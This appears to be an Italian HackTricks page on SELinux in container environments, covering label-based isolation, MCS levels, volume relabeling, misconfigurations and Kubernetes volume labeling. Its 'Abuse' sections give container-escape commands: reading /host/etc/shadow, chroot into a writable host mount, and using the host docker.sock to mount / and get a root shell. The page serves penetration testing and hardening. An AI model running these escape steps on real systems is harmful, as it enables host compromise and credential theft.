# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

SELinux è un sistema di **Mandatory Access Control basato sulle label**. Ogni processo e oggetto rilevante può avere un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, ciò significa solitamente che il runtime avvia il processo del container all'interno di un dominio container confinato e assegna al contenuto del container le label dei tipi corrispondenti. Se la policy funziona correttamente, il processo può essere in grado di leggere e scrivere gli elementi che la propria label dovrebbe gestire, mentre gli viene negato l'accesso ad altri contenuti dell'host, anche se tali contenuti diventano visibili tramite un mount.

Questa è una delle protezioni lato host più potenti disponibili nelle principali implementazioni di container Linux. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi incentrati su SELinux. In questi ambienti, un reviewer che ignora SELinux spesso non comprende perché un percorso apparentemente ovvio verso la compromissione dell'host sia in realtà bloccato.

## AppArmor Vs SELinux

La differenza generale più semplice è che AppArmor è basato sui percorsi, mentre SELinux è **basato sulle label**. Ciò ha importanti conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi diversamente se lo stesso contenuto dell'host diventa visibile sotto un percorso di mount imprevisto. Una policy basata sulle label, invece, verifica quale sia la label dell'oggetto e quali operazioni il dominio del processo possa eseguire su di esso. Questo non rende SELinux semplice, ma lo rende più resistente a una classe di supposizioni basate su trucchi dei percorsi che i defender a volte fanno accidentalmente nei sistemi basati su AppArmor.

Poiché il modello è orientato alle label, la gestione dei volumi dei container e le decisioni relative al relabeling sono aspetti critici per la sicurezza. Se il runtime o l'operatore modifica le label in modo troppo ampio per "far funzionare i mount", il confine della policy che avrebbe dovuto contenere il workload può diventare molto più debole del previsto.

## Laboratorio

Per verificare se SELinux è attivo sull'host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Per esaminare le label esistenti sull'host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Per confrontare un'esecuzione normale con una in cui l'assegnazione delle etichette è disabilitata:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Su un host con SELinux abilitato, questa è una dimostrazione molto pratica perché mostra la differenza tra un workload in esecuzione nel container domain previsto e uno a cui è stato rimosso quel livello di enforcement.

## Utilizzo a runtime

Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux fa parte dei default della piattaforma. Podman rootless insieme a SELinux è una delle baseline mainstream più solide per i container, perché il processo è già non privilegiato dal lato host e rimane comunque confinato dalla policy MAC. Docker può usare SELinux anche dove supportato, sebbene gli amministratori a volte lo disabilitino per aggirare i problemi legati al labeling dei volumi. CRI-O e OpenShift fanno ampio affidamento su SELinux come parte del loro modello di isolamento dei container. Anche Kubernetes può esporre impostazioni relative a SELinux, ma il loro valore dipende ovviamente dal fatto che il sistema operativo del nodo supporti ed effettivamente applichi SELinux.<sup>[[2]](#references)</sup>

La lezione ricorrente è che SELinux non è un componente ornamentale opzionale. Negli ecosistemi costruiti attorno a esso, fa parte del security boundary previsto. Per l'enumerazione delle policy dal lato host, l'analisi delle transizioni e l'abuso degli strumenti di amministrazione di SELinux, consulta la [pagina generale su SELinux](../../../interesting-files-permissions/selinux.md).

## Categorie MCS e rietichettatura dei volumi

L'isolamento dei container è normalmente una combinazione di **type enforcement** e **Multi-Category Security (MCS)**. Due processi possono essere entrambi eseguiti come `container_t`, ma ricevere livelli diversi come `s0:c123,c456` e `s0:c321,c654`. Il contenuto privato dei container è etichettato come `container_file_t` con le categorie corrispondenti, quindi il semplice raggiungimento del path di un altro container non è sufficiente per accedervi. I runtime normalmente allocano la coppia di categorie; riutilizzare manualmente un livello fa collassare deliberatamente questa separazione per-container.<sup>[[3]](#references)</sup>

Confronta le label dei processi e dei mount invece di controllare solo il type:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
I suffissi dei bind-mount modificano le etichette degli inode dell'host e quindi cambiano il confine di sicurezza, non solo i metadati del mount:<sup>[[3]](#references)</sup>

- `:Z` applica un'etichetta privata con le categorie MCS del container. È appropriata per un volume di proprietà di un singolo container o Pod.
- `:z` applica un'etichetta condivisa, in modo che anche altri container confinati possano utilizzare il contenuto (in base ai permessi DAC). Usarla per secrets o dati specifici di un tenant rimuove l'isolamento MCS che altrimenti separerebbe i container.
- Il relabeling è ricorsivo. Applicare una delle due opzioni ad ampi alberi dell'host come `/`, `/etc`, `/usr` o a un intero albero home può sia esporre il contenuto al container selezionato, sia impedire il funzionamento dei servizi dell'host le cui etichette previste sono state sostituite.

Il riutilizzo manuale dei livelli è facile da individuare nelle righe di comando e nei manifest. I due container seguenti ricevono intenzionalmente lo stesso livello MCS e possono quindi utilizzare il contenuto etichettato per quel livello:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Distingui inoltre `label=nested` da `label=disable`: il primo espone le operazioni SELinux all'interno del container e consente modifiche alle label solo dove la policy lo permette, mentre il secondo rimuove la separazione tramite label per quel workload. Entrambi meritano una revisione, ma non sono equivalenti.<sup>[[3]](#references)</sup>

## Misconfigurations

L'errore classico è `label=disable`. Operativamente, questo accade spesso perché un volume mount è stato negato e la risposta temporanea più rapida è stata rimuovere SELinux dall'equazione invece di correggere il modello di labeling.<sup>[[1]](#references)</sup> Un altro errore comune consiste nell'applicare un relabeling errato ai contenuti dell'host. Operazioni di relabeling estese possono far funzionare l'applicazione, ma possono anche ampliare ciò che il container può toccare ben oltre quanto originariamente previsto.

È inoltre importante non confondere SELinux **installed** con SELinux **effective**. Un host può supportare SELinux ed essere comunque in modalità permissive, oppure il runtime potrebbe non avviare il workload nel domain previsto. In questi casi la protezione è molto più debole di quanto la documentazione potrebbe suggerire.

## Abuse

Quando SELinux è assente, in modalità permissive o ampiamente disabilitato per il workload, i path montati dall'host diventano molto più facili da abusare. Lo stesso bind mount che altrimenti sarebbe stato limitato dalle label può diventare un accesso diretto ai dati dell'host o alla sua modifica. Ciò è particolarmente rilevante quando è combinato con writable volume mount, directory del container runtime o scorciatoie operative che espongono path sensibili dell'host per comodità.

SELinux spesso spiega perché un generico breakout writeup funziona immediatamente su un host ma fallisce ripetutamente su un altro, anche se i flag del runtime sembrano simili. L'elemento mancante spesso non è affatto un namespace o una capability, ma un confine basato sulle label che è rimasto intatto.

La verifica pratica più rapida consiste nel confrontare il context attivo e poi sondare i path montati dell'host o le directory del runtime che normalmente sarebbero limitati dalle label:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se è presente un host bind mount e l'etichettatura SELinux è stata disabilitata o indebolita, spesso la divulgazione di informazioni è il primo effetto:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se il mount è scrivibile e il container è effettivamente host-root dal punto di vista del kernel, il passaggio successivo consiste nel testare una modifica controllata dell'host invece di procedere per tentativi:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sugli host compatibili con SELinux, la perdita delle label nelle directory dello stato di runtime può inoltre esporre percorsi diretti di privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Questi comandi non sostituiscono una catena completa di escape, ma chiariscono molto rapidamente se era SELinux a impedire l’accesso ai dati dell’host o la modifica dei file lato host.

### Esempio completo: SELinux disabilitato + mount dell’host scrivibile

Se l’etichettatura SELinux è disabilitata e il filesystem dell’host è montato in modalità scrittura su `/host`, un full host escape diventa un normale caso di abuso di bind mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se `chroot` ha esito positivo, il processo del container ora opera dal filesystem dell'host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Esempio completo: SELinux disabilitato + directory di runtime

Se il workload può raggiungere un socket di runtime una volta disabilitate le label, l'escape può essere delegata al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'osservazione rilevante è che SELinux spesso era il controllo che impediva esattamente questo tipo di accesso ai percorsi dell'host o allo stato di runtime.

## Controlli

L'obiettivo dei controlli di SELinux è confermare che SELinux sia abilitato, identificare il contesto di sicurezza corrente e verificare se i file o i percorsi di interesse siano effettivamente confinati tramite etichette.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Cosa è interessante qui:

- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambiano il significato dell'intera sezione SELinux.
- Se il contesto del processo corrente appare imprevisto o troppo ampio, il workload potrebbe non essere in esecuzione con la policy del container prevista.
- Se i file montati dall'host o le directory di runtime hanno label a cui il processo può accedere troppo liberamente, i bind mount diventano molto più pericolosi.

Quando si esamina un container su una piattaforma compatibile con SELinux, non considerare il labeling un dettaglio secondario. In molti casi è uno dei motivi principali per cui l'host non è già compromesso.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Dipendente dall'host | La separazione SELinux è disponibile sugli host con SELinux abilitato, ma il comportamento esatto dipende dalla configurazione dell'host e del daemon | `--security-opt label=disable`, relabeling ampio dei bind mount, `--privileged` |
| Podman | Comunemente abilitato sugli host con SELinux | La separazione SELinux è una parte normale di Podman sui sistemi SELinux, a meno che non venga disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Assegnato dal runtime sui nodi SELinux; configurabile esplicitamente | Il runtime può allocare una label univoca quando il Pod non ne specifica una. `securityContext.seLinuxOptions` controlla esplicitamente la label del Pod/volume; su Kubernetes 1.37, i volumi idonei utilizzano il labeling SELinux dei mount per impostazione predefinita | livelli MCS duplicati, nodi permissivi/disabilitati, workload privilegiati troppo ampi, uso indiscriminato di `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| Deployment in stile CRI-O / OpenShift | Comunemente utilizzato in modo intensivo | SELinux è spesso una parte fondamentale del modello di isolamento del nodo in questi ambienti | policy personalizzate che ampliano eccessivamente l'accesso, disabilitazione del labeling per compatibilità |

Le impostazioni predefinite di SELinux dipendono maggiormente dalla distribuzione rispetto a quelle di seccomp. Sui sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Sui sistemi privi di SELinux, è semplicemente assente.

## Labeling dei volumi in Kubernetes 1.37

Kubernetes 1.37 ha reso `SELinuxMount` stabile e lo ha abilitato per impostazione predefinita. Per una PVC idonea, un Pod con `seLinuxOptions` e un driver CSI che dichiara `.spec.seLinuxMount: true`, kubelet utilizza `-o context=<label>` invece di chiedere al runtime di eseguire il relabeling ricorsivo di ogni inode. I driver e i tipi di volume non supportati utilizzano ancora il percorso ricorsivo. Questo evita una lunga operazione di relabeling e impedisce inoltre di modificare le label persistenti di ogni file semplicemente per esporre il volume a un Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Un mount può avere un solo contesto di questo tipo. Di conseguenza, i Pod con **label SELinux diverse** che utilizzano lo stesso volume idoneo sullo stesso nodo non coesistono più con il comportamento `MountOption` predefinito: uno rimane in `ContainerCreating` con un errore `conflicting SELinux labels of volume`. Consideralo sia un problema di disponibilità sia un'indicazione utile del fatto che i workload stavano condividendo implicitamente lo storage oltre i confini MCS. Se questa condivisione è intenzionale, ad esempio un Pod privilegiato `spc_t` e un Pod confinato che utilizzano lo stesso volume, il meccanismo di compatibilità per singolo Pod è `seLinuxChangePolicy: Recursive`; non applicarlo a livello di cluster senza comprendere quali percorsi il runtime sottoporrà a relabeling.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Controlli utili lato cluster:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Il `selinux-warning-controller` opzionale di `kube-controller-manager` rileva i Pod che condividono un volume con label incompatibili ed espone la metrica `selinux_warning_controller_selinux_volume_conflict`. Abilitatelo e verificatelo prima degli aggiornamenti o prima di modificare il comportamento delle label dei volumi; aiuta a distinguere un vero conflitto di policy da un normale errore di CSI o del filesystem.<sup>[[2]](#references)</sup>

## References

- [1] [Documentazione di Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configurare un Security Context per un Pod o Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Documentazione di Podman run: label SELinux e rietichettatura dei volumi](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Release di Kubernetes v1.37: SELinuxMount e SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
